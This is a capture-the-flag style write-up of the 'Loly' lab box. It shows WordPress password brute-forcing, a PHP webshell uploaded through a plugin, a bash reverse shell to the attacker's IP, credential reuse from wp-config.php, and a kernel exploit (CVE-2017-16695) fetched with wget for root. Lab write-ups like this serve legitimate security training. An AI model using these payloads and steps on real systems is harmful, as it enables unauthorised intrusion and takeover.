---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/loly-1,538/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Lets start with a simple port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p80 -sV 192.168.242.121
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 19:23 CEST
Nmap scan report for 192.168.242.121
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds
```

## dir busting
```bash
$ gobuster dir -k -u http://192.168.242.121/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.121/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/08/14 19:24:16 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 194] [--> http://192.168.242.121/wordpress/]
Progress: 18418 / 18460 (99.77%)
===============================================================
2023/08/14 19:26:09 Finished
===============================================================
```

> `wordpress` installation identified!
{: .prompt-info }

Accessing the `wordpress` instance shows that we need to add an entry to our `/etc/hosts` file.
```http
GET /wordpress/ HTTP/1.1
Host: 192.168.242.121
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 14 Aug 2023 17:26:13 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Link: <http://loly.lc/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
Content-Length: 28194

<!DOCTYPE html><html lang="en-US">
...
```

> Add `TARGETIP loly.lc` to `/etc/hosts`
{: .prompt-info }

---

# exploitation
## `wordpress` weak credentials
Using `wpscan` reveals a user account with weak credentials.
```bash
$ wpscan --url http://loly.lc/wordpress/ --wp-content-dir wp-admin --passwords /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://loly.lc/wordpress/ [192.168.242.121]
[+] Started: Mon Aug 14 19:37:58 2023
...
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - loly / fernando                                                                                                                                                                                                                 
^Cying A WordPress Commenter / millie Time: 00:00:12 
[!] Valid Combinations Found:
 | Username: loly, Password: fernando
...
```

> `loly:fernando`
{: .prompt-info }

## malicious upload
> After we are logged via the `/wp-admin` we see the admin panel, but we are not able to upload a plugin or edit a theme.
{: .prompt-danger }

> The only unusual plugin which seems to be interesting is `AdRotate`.
{: .prompt-info }

Going through the settings of the plugin reveals a feature to upload files.  
`AdRotate -> Manage Media -> Upload new file (Banner)` 
  
There are some filters in place, but we are allowed to upload `zip` files. As soon as the file was uploaded it got unzipped in the folder `/wordpress/wp-content/banners/`.
  
So we start by creating a simple shell file (`shell.php`), zip it and then upload it to the target in the described way.

```php
$ cat shell.php 
<?php
system($_REQUEST['cmd']);
?>
```
  
```
$ zip shell.zip shell.php
```

Now we have a webshell.
```http
GET /wordpress/wp-content/banners/shell.php?cmd=id HTTP/1.1
Host: loly.lc
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_6cbd66145d405532f25f0b0c2e6ebf30=loly%7C1692207675%7CNN42YdiLky89bmpOKHqoqHfUeRiwpXRAqkLaWV1fEBF%7C79668c764b94e33a84d2f63b10cc4240cf4a6db7f034e3a98dfdb0b0221a0bbe; wp-settings-1=libraryContent%3Dupload; wp-settings-time-1=1692034890
Connection: close

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 14 Aug 2023 18:00:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 54

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> And it works! A shell! Yay!
{: .prompt-info }

---

# post exploitation
## reverse shell
Start listener on attacker machine.
```bash
$ nc -lvp 80                  
listening on [any] 80 ...
```

Trigger reverse shell.
payload: `bash -c 'bash -i >& /dev/tcp/192.168.45.186/80 0>&1'`
```bash
GET /wordpress/wp-content/banners/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.186/80+0>%261' HTTP/1.1
Host: loly.lc
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_6cbd66145d405532f25f0b0c2e6ebf30=loly%7C1692207675%7CNN42YdiLky89bmpOKHqoqHfUeRiwpXRAqkLaWV1fEBF%7C79668c764b94e33a84d2f63b10cc4240cf4a6db7f034e3a98dfdb0b0221a0bbe; wp-settings-1=libraryContent%3Dupload; wp-settings-time-1=1692034890
Connection: close
```

Catch connection from target.
```bash
$ nc -lvp 80                  
listening on [any] 80 ...
connect to [192.168.45.186] from loly.lc [192.168.242.121] 38958
bash: cannot set terminal process group (3171): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:~/html/wordpress/wp-content/banners$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## get first flag
```bash
www-data@ubuntu:~$ pwd
pwd
/var/www
www-data@ubuntu:~$ ls
ls
html
local.txt
www-data@ubuntu:~$ cat local.txt
cat local.txt
8*******************************b
```

## privilege escalation
Upgrade to a full `tty` shell.
```bash
www-data@ubuntu:/home$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/home$ export TERM=xterm                     
export TERM=xterm
```

Check `wp-config.php` file.
```php
www-data@ubuntu:~/html/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
...
**/
/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
...
```

Check what user exist on the system.
```bash
www-data@ubuntu:/home$ ls
ls
loly
```

> There is a user named `loly` which might use the password we just found.
{: .prompt-info }

```bash
www-data@ubuntu:/home$ su loly
su loly
Password: lolyisabeautifulgirl

loly@ubuntu:/home$
```

> Yes! We are `loly` now!
{: .prompt-info }

Lets upload `linpeas`.  
Provide `linpeas` with a simple web server on the attacker machine.
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Upload `linpeas` to target machine.
```bash
loly@ubuntu:/tmp$ wget 192.168.45.186/linpeas.sh
wget 192.168.45.186/linpeas.sh
--2023-08-14 11:16:21--  http://192.168.45.186/linpeas.sh
Connecting to 192.168.45.186:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830030 (811K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 810.58K  1.37MB/s    in 0.6s    

2023-08-14 11:16:22 (1.37 MB/s) - ‘linpeas.sh’ saved [830030/830030]
```

Execute `linpeas`.
```bash
loly@ubuntu:/tmp$ sh linpeas.sh 
sh linpeas.sh
...
OS: Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016q
...
```

> The target uses an outdated kernel and `gcc` is installed. So we probably have to compile a kernel exploit and execute it on the target to get `root`.
{: .prompt-info }

Lets use the exploit suggester: `https://github.com/jondonas/linux-exploit-suggester-2`  
We upload the suggester the same way we uploaded `linpeas`.  
```bash
loly@ubuntu:/tmp$ wget 192.168.45.186/linux-exploit-suggester-2.pl
wget 192.168.45.186/linux-exploit-suggester-2.pl
--2023-08-14 11:32:30--  http://192.168.45.186/linux-exploit-suggester-2.pl
Connecting to 192.168.45.186:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24292 (24K) [text/x-perl]
Saving to: ‘linux-exploit-suggester-2.pl’

linux-exploit-sugge 100%[===================>]  23.72K  --.-KB/s    in 0.03s   

2023-08-14 11:32:30 (713 KB/s) - ‘linux-exploit-suggester-2.pl’ saved [24292/24292]
```

Now lets see what exploit might be suitable.
```bash
loly@ubuntu:/tmp$ perl linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 4.4.0
  Searching 72 exploits...

  Possible Exploits
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010
```

> Lets try `CVE-2017-16695`
{: .prompt-info }

We upload the exploit the same way we uploaded `linpeas`.  
```bash
loly@ubuntu:/tmp$ wget 192.168.45.186/45010.c
wget 192.168.45.186/45010.c
--2023-08-14 11:33:38--  http://192.168.45.186/45010.c
Connecting to 192.168.45.186:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13176 (13K) [text/x-csrc]
Saving to: ‘45010.c’

45010.c             100%[===================>]  12.87K  --.-KB/s    in 0.007s  

2023-08-14 11:33:38 (1.70 MB/s) - ‘45010.c’ saved [13176/13176]
```

Compile and execute.
```bash
loly@ubuntu:/tmp$ gcc 45010.c -o pe
gcc 45010.c -o pe
loly@ubuntu:/tmp$ ls
ls
45010.c
linpeas.sh
linux-exploit-suggester-2.pl
pe
systemd-private-ff615ae5591f4434acd89932d9e7b029-systemd-timesyncd.service-LrymyF
VMwareDnD
vmware-root
loly@ubuntu:/tmp$ ./pe
./pe
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880034a62100
[*] Leaking sock struct from ffff880035e64b40
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88007bf32000
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88007bf32000
[*] credentials patched, launching shell...
# id
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
```

> Yes! We are `root`.
{: .prompt-info }

## get second flag
```bash
# cd /root
cd /root
# ls
ls
proof.txt  root.txt
# cat proof.txt
cat proof.txt
2******************************0
```

Pwned! <@:-)
